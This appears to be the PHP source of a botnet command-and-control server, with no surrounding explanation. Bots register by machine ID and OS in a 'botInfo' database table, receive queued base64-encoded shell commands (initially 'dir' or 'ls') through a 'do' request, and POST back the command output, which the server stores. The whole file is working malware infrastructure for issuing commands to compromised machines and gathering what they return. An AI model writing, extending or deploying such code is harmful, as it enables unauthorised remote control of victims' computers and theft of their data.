<?php

	include ('db.php');

	if (isset($_GET["func"])) {
		$callingFunction=$_GET['func'];	
		if (isset($_GET["osName"])) $osName=$_GET['osName'];
		$machineID=$_GET['machineID'];
		if ($callingFunction == 'sync') {
			$stmt = $mysqli->stmt_init();
			$sqlFunc="SELECT id as Total FROM botInfo WHERE machineID=?";
			if ($stmt->prepare($sqlFunc)) {
				$stmt->bind_param("s", $machineID);
				$stmt->execute();
				$stmt->store_result();
				$rowCount = $stmt->num_rows;
			}
			if ($rowCount == 0) {
				if ($osName == 'nt') $httpCommand=base64_encode('dir');
				if ($osName == 'posix') $httpCommand=base64_encode('ls');
				$stmt = $mysqli->stmt_init();
				$sqlInsert="INSERT INTO botInfo (machineID, osType, httpCommand, executed) VALUES (?, ?, ?, 'N')";
				if ($stmt->prepare($sqlInsert)) {
					$stmt->bind_param("sss", $machineID, $osName, $httpCommand);
					$stmt->execute();
				}
			}
		}
		if ($callingFunction == 'do') {
			$stmt = $mysqli->stmt_init();
			$sqlFunc="SELECT httpCommand FROM botInfo WHERE machineID=? AND executed='N' LIMIT 1";
			if ($stmt->prepare($sqlFunc)) {
				$stmt->bind_param("s", $machineID);
				$stmt->execute();
				$stmt->store_result();
				$rowCount = $stmt->num_rows;
				$stmt->bind_result($httpCommand);
				if ($rowCount > 0) {
       					while ($stmt->fetch()) {
           					echo "$httpCommand";
       					}	
				}
				else {
					echo base64_encode("NOTHING");
				}	
			}
		}
	}
	else if (isset($_POST["machineID"])) {
		$machineID = $_POST['machineID'];
		$httpCommand = $_POST['command'];	
		$httpResults = $_POST['output'];
		$stmt = $mysqli->stmt_init();
		$sqlUpdate="UPDATE botInfo SET httpResults=?, executed='Y' WHERE machineID=? AND httpCommand=?";
		if ($stmt->prepare($sqlUpdate)) {
			$stmt->bind_param("sss", $httpResults, $machineID, $httpCommand);
			$stmt->execute();
		}
	}

?>
